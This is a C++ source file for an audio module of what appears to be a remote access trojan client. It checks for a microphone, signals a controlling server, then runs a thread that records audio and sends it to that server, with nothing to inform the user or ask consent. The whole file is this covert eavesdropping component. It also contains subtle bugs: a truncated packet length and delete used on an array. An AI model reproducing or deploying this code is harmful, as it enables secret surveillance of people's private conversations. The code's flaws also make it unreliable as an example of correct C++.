#include "stdafx.h"
#include "AudioManager.h"
#include <tchar.h>
#include <mmeapi.h>


CAudioManager::CAudioManager(CIOCPClient *IOCPClient)
	: CManager(IOCPClient)
{
	_tprintf(_T("AudioManager is under Execution\r\n"));

	_M_IsWorking = FALSE;
	_M_Audio     = NULL;
	_M_hWorkThread = NULL;

	if (Initialize() == FALSE)
	{
		return;
	}

	BYTE IsToken = CLIENT_AUDIO_MANAGER_REPLY;

	_M_IOCPClient->OnServerSending((char*)&IsToken, sizeof(BYTE));

	WaitForServerDialogOpen();
	
	_M_hWorkThread = CreateThread(
							NULL,
							0,
							(LPTHREAD_START_ROUTINE)_AudioPlayProc,
							(LPVOID)this,
							0,
							NULL
						);

	return;
}

CAudioManager::~CAudioManager()
{
	_tprintf(_T("AudioManager Exit\r\n"));

	_M_IsWorking = FALSE;
	WaitForSingleObject(_M_hWorkThread, INFINITE);

	if (_M_hWorkThread != NULL)
	{
		CloseHandle(_M_hWorkThread);
		_M_hWorkThread = NULL;
	}


	if (_M_Audio != NULL)
	{
		delete _M_Audio;
		_M_Audio = NULL;
	}

}


void CAudioManager::PacketHandleIO(PBYTE BufferData, ULONG_PTR BufferLength)
{
	switch (BufferData[0])
	{
	case CLIENT_GO_ON:
	{
		NotifyDialogIsOpen();
		break;
	}
	default:
		break;
	}
	return;
}

BOOL CAudioManager::Initialize()
{
	if (!waveInGetNumDevs())
		return FALSE;

	if (_M_IsWorking == TRUE)
		return FALSE;

	_M_Audio = new CAudio;

	_M_IsWorking = TRUE;

	return TRUE;
}

int  CAudioManager::SendRecordData()
{
	ULONG BufferLength = 0;
	DWORD rLen = 0;

	LPBYTE BufferData = _M_Audio->GetRecordData(&BufferLength);
	if (BufferData == NULL)
		return 0;
	LPBYTE Packet = new BYTE[BufferLength + 1];

	Packet[0] = CLIENT_AUDIO_RECORD_DATA;
	memcpy(Packet + 1, BufferData, BufferLength);

	if (BufferLength > 0)
		rLen = _M_IOCPClient->OnServerSending((char*)Packet, BufferLength);
	
	if (Packet != NULL) {
		delete Packet;
		Packet = NULL;
	}
	return rLen;
}

DWORD WINAPI CAudioManager::_AudioPlayProc(LPVOID lParam)
{
	CAudioManager* This = (CAudioManager*)lParam;
	while (This->_M_IsWorking)
	{
		This->SendRecordData();
	}

	return 0;
}

